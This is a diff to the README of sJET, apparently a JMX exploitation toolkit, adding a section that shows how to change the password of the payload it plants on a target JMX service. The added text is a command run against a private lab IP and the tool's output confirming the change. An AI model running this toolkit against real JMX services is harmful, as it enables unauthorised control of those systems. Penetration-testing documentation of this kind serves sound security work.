@@ -153,6 +153,24 @@ java.specification.version=1.8
 h0ng10@rocksteady:~/sjet$
 ```
 
+### Change the password
+
+Change the existing password ("super_secret") to "this-is-the-new-password":
+
+```
+h0ng10@rocksteady:~/sjet$ jython sjet.py 192.168.11.136 9991 super_secret password this-is-the-new-password
+sJET - siberas JMX Exploitation Toolkit
+=======================================
+[+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.11.136:9991/jmxrmi
+[+] Connected: rmi://192.168.11.132  6
+[+] Loaded de.siberas.lab.SiberasPayload
+[+] Successfully changed password
+
+[+] Done
+h0ng10@rocksteady:~/sjet$
+```
+
+
 ## Contributing
 
 Feel free to contribute.
